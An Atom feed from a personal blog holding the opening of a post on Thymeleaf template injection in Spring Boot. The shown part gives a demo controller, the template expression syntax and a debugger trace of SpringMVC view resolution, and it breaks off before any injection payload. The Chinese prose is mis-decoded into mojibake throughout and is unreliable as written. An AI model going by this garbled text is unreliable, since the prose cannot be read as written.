<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clownçš„ç«™ç‚¹</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2024-12-13T16:58:34.139Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>thymeleafæ¨¡æ¿æ³¨å…¥</title>
    <link href="https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2024-12-12T16:09:58.000Z</published>
    <updated>2024-12-13T16:58:34.139Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å®åœ¨æ˜¯ä¸çŸ¥é“çœ‹ä»€ä¹ˆäº†ï¼Œæ¥å­¦ä¸€ä¸‹å’Œjavaç›¸å…³çš„ä¸€äº›sstiå§ï¼Œå…ˆä»thymeleafå¼€å§‹</p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>Thymeleafå°±æ˜¯ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œå’Œpythonçš„jinjia2ä¸€æ ·ï¼Œå°±ä¸éœ€è¦è¿‡å¤šä»‹ç»äº†</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p><p>é«˜ç‰ˆæœ¬SpringBoot&#x2F;Thymeleafä¸å­˜åœ¨æ¨¡æ¿æ³¨å…¥é—®é¢˜ï¼Œè¿™é‡ŒSpringBootç‰ˆæœ¬ä¸º2.5.10(å®æµ‹å¾—2.4.1ï¼Œ2.5.10å·²ç»ä¸è¡Œäº†)ï¼ŒThymeleafåŒä¸Š</p><h1 id="demoç¤ºä¾‹"><a href="#Demoç¤ºä¾‹" class="headerlink" title="Demoç¤ºä¾‹"></a>Demoç¤ºä¾‹</h1><p>é¦–å…ˆå°±æ˜¯åˆ›å»ºä¸€ä¸ªspringbooté¡¹ç›®ï¼Œæˆ‘ä»¬çš„thymeleafæ–‡ä»¶å°±å†™åœ¨templatesç›®å½•ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241213110130755.png" alt="image-20241213110130755"></p><p>åˆ›å»ºé¡¹ç›®çš„æ—¶å€™å¯ä»¥å‹¾é€‰thymeleafæ¨¡æ¿å¼•æ“</p><p><img src="https://cdn.clown2024.cn/image-20241213110353299.png" alt="image-20241213110353299"></p><p>ä¸€ä¸ªåŸºç¡€çš„index.html</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>hello ç¬¬ä¸€ä¸ªThymeleafç¨‹åº<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;name&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/demo&quot;)</span><br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(Model model)</span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç”¨<code>@Controller</code>æ³¨è§£æ‰è¡Œï¼Œå› ä¸ºè¯¥æ³¨è§£ä¸»è¦ä½œç”¨æ˜¯è¿”å›è§†å›¾åç§°ï¼Œè¿™äº›è§†å›¾åç§°ä¼šè¢«Springçš„è§†å›¾è§£æå™¨ï¼ˆView Resolverï¼‰è§£æï¼Œä»è€Œæ‰¾åˆ°å¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶ï¼ˆå¦‚Thymeleafæ¨¡æ¿ï¼‰ï¼Œå¹¶å°†æ¨¡å‹æ•°æ®æ¸²æŸ“åˆ°æ¨¡æ¿ä¸­ï¼Œæœ€ç»ˆç”Ÿæˆå“åº”ç»™å®¢æˆ·ç«¯çš„è§†å›¾ã€‚</p><p><code>@RestController</code>æ³¨è§£æ˜¯<code>@Controller</code>å’Œ<code>@ResponseBody</code>çš„ç»„åˆï¼Œå®ƒé€šå¸¸ç”¨äºåˆ›å»ºRESTful WebæœåŠ¡ã€‚<code>@RestController</code>æ³¨è§£çš„æ§åˆ¶å™¨æ–¹æ³•çš„è¿”å›å€¼ä¼šè‡ªåŠ¨ä½œä¸ºHTTPå“åº”çš„æ­£æ–‡è¿”å›ï¼Œè¿™æ„å‘³ç€è¿”å›å€¼ä¸ä¼šè¢«è§†å›¾è§£æå™¨å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥å†™å…¥HTTPå“åº”ä½“ä¸­ã€‚</p><h1 id="ä¸€äº›è¯­æ³•"><a href="#ä¸€äº›è¯­æ³•" class="headerlink" title="ä¸€äº›è¯­æ³•"></a>ä¸€äº›è¯­æ³•</h1><p>thymeleafçš„htmlæ–‡ä»¶é¦–å…ˆè¦åŒ…å«è¿™ä¸ª</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ ‡ç­¾</strong></p><table><thead><tr><th>æ ‡ç­¾</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>th:id</td><td>æ›¿æ¢id</td><td><code>&lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td></tr><tr><td>th:text</td><td>æ–‡æœ¬æ›¿æ¢</td><td><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td></tr><tr><td>th:utext</td><td>æ”¯æŒhtmlçš„æ–‡æœ¬æ›¿æ¢</td><td><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td></tr><tr><td>th:object</td><td>æ›¿æ¢å¯¹è±¡</td><td><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td></tr><tr><td>th:value</td><td>æ›¿æ¢å€¼</td><td><code>&lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td></tr><tr><td>th:each</td><td>è¿­ä»£</td><td><code>&lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td></tr><tr><td>th:href</td><td>æ›¿æ¢è¶…é“¾æ¥</td><td><code>&lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;è¶…é“¾æ¥&lt;/a&gt;</code></td></tr><tr><td>th:src</td><td>æ›¿æ¢èµ„æº</td><td><code>&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td></tr></tbody></table><p><strong>é“¾æ¥è¡¨è¾¾å¼</strong></p><p>ä½¿ç”¨<code>@&#123;èµ„æºåœ°å€&#125;</code>å¼•å…¥èµ„æºï¼Œå¼•å…¥çš„åœ°å€å¯ä»¥åœ¨staticç›®å½•ï¼Œä¹Ÿå¯ä»¥æ˜¯äº’è”ç½‘çš„èµ„æºï¼Œæ ¼å¼å¦‚ä¸Šé¢çš„æ ‡ç­¾ç¤ºä¾‹</p><p><strong>å˜é‡è¡¨è¾¾å¼</strong></p><p>è¿™éƒ¨åˆ†ä¹Ÿæ˜¯é¡µé¢èƒ½åŠ¨æ€æ¸²æŸ“çš„æ ¸å¿ƒï¼Œå¯ä»¥ç”¨<code>$&#123;...&#125;</code>çš„å½¢å¼åœ¨modelä¸­å–å€¼ï¼Œå‰é¢çš„demoä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¾€modelä¸­æ·»åŠ äº†å±æ€§çš„é”®å€¼å¯¹</p><p>å–JavaBeanå¯¹è±¡ä½¿ç”¨<code>$&#123;å¯¹è±¡å.å¯¹è±¡å±æ€§&#125;</code>æˆ–è€…<code>$&#123;å¯¹è±¡å[&#39;å¯¹è±¡å±æ€§&#39;]&#125;</code>æ¥å–å€¼ã€‚å¦‚æœJavaBeanå†™äº†getæ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡<code>$&#123;å¯¹è±¡.getæ–¹æ³•å&#125;</code>å–å€¼ã€‚</p><p>å–Mapå¯¹è±¡ä½¿ç”¨<code>$&#123;Mapå[&#39;key&#39;]&#125;</code>æˆ–<code>$&#123;Mapå.key&#125;</code></p><p>å–Listé›†åˆï¼šListé›†åˆæ˜¯ä¸€ä¸ªæœ‰åºåˆ—è¡¨ï¼Œéœ€è¦ä½¿ç”¨eachéå†èµ‹å€¼ï¼Œ<code>&lt;tr th:each=&quot;item:$&#123;userlist&#125;&quot;&gt;</code></p><p><strong>é€‰æ‹©å˜é‡è¡¨è¾¾å¼</strong></p><p>è¯¥è¡¨è¾¾å¼çš„å†™æ³•ä¸º*{â€¦}ï¼Œå†™ä¸ªä¾‹å­å°±æ˜ç™½äº†</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;name&#125;&quot;</span>&gt;</span>èµ›<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;age&#125;&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;detail&#125;&quot;</span>&gt;</span>å¥½å¥½å­¦ä¹ <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">user</span><span class="hljs-params">(Model model)</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;clown&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213143906940.png" alt="image-20241213143906940"></p><p><strong>æ¶ˆæ¯è¡¨è¾¾å¼</strong></p><p>æ–‡æœ¬å¤–éƒ¨åŒ–æ˜¯ä»æ¨¡æ¿æ–‡ä»¶ä¸­æå–æ¨¡æ¿ä»£ç çš„ç‰‡æ®µï¼Œä»¥ä¾¿å¯ä»¥å°†å®ƒä»¬ä¿å­˜åœ¨å•ç‹¬çš„æ–‡ä»¶(é€šå¸¸æ˜¯.propertiesæ–‡ä»¶)ä¸­,æ–‡æœ¬çš„å¤–éƒ¨åŒ–ç‰‡æ®µé€šå¸¸ç§°ä¸ºâ€œæ¶ˆæ¯â€ã€‚é€šä¿—æ˜“æ‡‚çš„æ¥è¯´<code>#&#123;â€¦&#125;</code>è¯­æ³•å°±æ˜¯ç”¨æ¥è¯»å–é…ç½®æ–‡ä»¶ä¸­æ•°æ®çš„ã€‚</p><p>è¿™é‡Œä¹Ÿå†™ä¸ªä¾‹å­æ›´å¥½ä½“ä¼šï¼Œé¦–å…ˆåœ¨templatesç›®å½•ä¸‹å»ºç«‹<code>clown.properties</code>ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">demo.nane=clown<br>demo.age=22<br>province=UnKnown<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨application.propertiesåŠ å…¥ä¸‹é¢å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">spring.messages.basename=templates/demo<br></code></pre></td></tr></table></figure><p>htmlå†…å®¹å¦‚ä¸‹</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.age&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.nane&#125;&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Province: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;province&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241213145707765.png" alt="image-20241213145707765"></p><p><strong>ç‰‡æ®µè¡¨è¾¾å¼</strong></p><p>ç‰‡æ®µè¡¨è¾¾å¼<code>~&#123;...&#125;</code>å¯ä»¥ç”¨äºå¼•ç”¨å…¬å…±çš„ç›®æ ‡ç‰‡æ®µï¼Œæ¯”å¦‚å¯ä»¥åœ¨ä¸€ä¸ª<code>template/public.html</code>ä¸­å®šä¹‰ä¸‹é¢çš„ç‰‡æ®µ,å¹¶åœ¨å¦ä¸€ä¸ªtemplateä¸­å¼•ç”¨ã€‚</p><p>å…¬å…±ç‰‡æ®µï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;copy&quot;</span>&gt;</span><br>    Â© 2011 The Good Thymes Virtual Grocery<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¼•ç”¨å…¬å…±ç‰‡æ®µï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;public :: copy&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213175923703.png" alt="image-20241213175923703"></p><h1 id="springmvcè§†å›¾è§£æè¿‡ç¨‹"><a href="#SpringMVCè§†å›¾è§£æè¿‡ç¨‹" class="headerlink" title="SpringMVCè§†å›¾è§£æè¿‡ç¨‹"></a>SpringMVCè§†å›¾è§£æè¿‡ç¨‹</h1><p>è§†å›¾è§£æçš„è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨Controllerå¤„ç†åï¼ŒControllerå¤„ç†ç»“æŸåä¼šå°†è¿”å›çš„ç»“æœå°è£…ä¸º<code>ModelAndView</code>å¯¹è±¡ï¼Œå†é€šè¿‡è§†å›¾è§£æå™¨<code>ViewResovler</code>å¾—åˆ°å¯¹åº”çš„è§†å›¾å¹¶è¿”å›ã€‚</p><p>ç»™ä¸€å¼ SpringMVCçš„æ‰§è¡Œæµç¨‹å›¾</p><p><img src="http://cdn.clown2024.cn/202407270110622.png" alt="image-20240727011007456"></p><p>æˆ‘ä»¬å¯ä»¥ç”¨å‰é¢çš„demoè·Ÿè¿›è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹è§†å›¾æ˜¯å¦‚ä½•è§£æçš„</p><h2 id="å°è£…modelandviewå¯¹è±¡"><a href="#å°è£…ModelAndViewå¯¹è±¡" class="headerlink" title="å°è£…ModelAndViewå¯¹è±¡"></a>å°è£…ModelAndViewå¯¹è±¡</h2><p>å…ˆèµ°åˆ°<code>ServletInvocableHandlerMethod#invokeAndHandle</code>ä¸­ï¼Œå…¶æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>setResponseStatus(webRequest);<br><br><span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (isRequestNotModified(webRequest) || getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>disableContentCachingIfNecessary(webRequest);<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(getResponseStatusReason())) &#123;<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(formatErrorForReturnValue(returnValue), ex);<br>&#125;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›¸å…³çš„å˜é‡å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241213214443799.png" alt="image-20241213214443799"></p><p>è¯¥å‡½æ•°å†…éƒ¨è¿›è¡Œäº†å¦‚ä¸‹æ“ä½œï¼š</p><ul><li><code>invokeForRequest</code>è°ƒç”¨Controlleråè·å–è¿”å›å€¼åˆ°<code>returnValue</code>ä¸­</li><li>åˆ¤æ–­<code>returnValue</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯åˆ™ç»§ç»­åˆ¤æ–­<code>RequestHandled</code>æ˜¯å¦ä¸º<code>True</code>ï¼Œéƒ½æ»¡è¶³çš„è¯è®¾ç½®<code>requestHandled</code>ä¸º<code>true</code></li><li>é€šè¿‡<code>handleReturnValue</code>æ ¹æ®è¿”å›å€¼çš„ç±»å‹å’Œè¿”å›å€¼å°†ä¸åŒçš„å±æ€§è®¾ç½®åˆ°<code>ModelAndViewContainer</code>ä¸­ã€‚</li></ul><p>è¿™é‡Œå¾€ä¸‹èµ°returnValueè¿”å›çš„æ˜¯index</p><p><img src="https://cdn.clown2024.cn/image-20241213214722184.png" alt="image-20241213214722184"></p><p>ç„¶åå†çœ‹handleReturnValueæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åº”è¯¥å°±æ˜¯å¯¹æ¨¡æ¿è¿›è¡Œè§£æï¼Œç»§ç»­è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241213221758950.png" alt="image-20241213221758950"></p><p>è·å–ä¸€ä¸ªViewNameMethodReturnValueHandlerç„¶åç»§ç»­å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241213222152893.png" alt="image-20241213222152893"></p><ul><li>åˆ¤æ–­returnValueç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦å‹ï¼Œè®¾ç½®<code>mavContainer.viewName</code></li><li>åˆ¤æ–­returnValueæ˜¯å¦ä»¥<code>redirect:</code>å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™è®¾ç½®é‡å®šå‘çš„å±æ€§</li></ul><p>ç„¶åè¿”å›åˆ°RequestMappingHandlerAdapter#invokeHandlerMethodæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241213222951397.png" alt="image-20241213222951397"></p><p>é€šè¿‡getModelAndViewæ–¹æ³•è¿”å›ModelAndView</p><h2 id="è·å–modelandviewè§†å›¾"><a href="#è·å–ModelAndViewè§†å›¾" class="headerlink" title="è·å–ModelAndViewè§†å›¾"></a>è·å–ModelAndViewè§†å›¾</h2><p>è·å–<code>ModelAndView</code>åï¼Œé€šè¿‡<code>DispatcherServlet#render</code>è·å–è§†å›¾è§£æå™¨å¹¶æ¸²æŸ“ï¼Œä¸­é—´çš„è¿‡ç¨‹å°±ä¸å†åˆ†æäº†ï¼Œå°±æ˜¯æ¯ç‡¥çš„è·Ÿç€èµ°è€Œå·²</p><p>ä¸è¿‡åˆ°è¿™é‡Œæµç¨‹ä¹Ÿå¾ˆç¬¦åˆå‰é¢æµç¨‹å›¾æ‰€æ€»ç»“çš„é‚£æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241213223643677.png" alt="image-20241213223643677"></p><p>resolveViewNameæ˜¯éå†è§†å›¾è§£æå™¨ç„¶åè¿”å›ä¸€ä¸ªï¼Œå…¶ä¸­é‡Œé¢æœ‰äº”ä¸ªè§†å›¾è§£æå™¨</p><p><img src="https://cdn.clown2024.cn/image-20241213224250552.png" alt="image-20241213224250552"></p><p>è¿™é‡Œè¿”å›çš„Viewæ˜¯ThymeleafView</p><p><img src="https://cdn.clown2024.cn/image-20241213224019290.png" alt="image-20241213224019290"></p><h2 id="è§†å›¾æ¸²æŸ“"><a href="#è§†å›¾æ¸²æŸ“" class="headerlink" 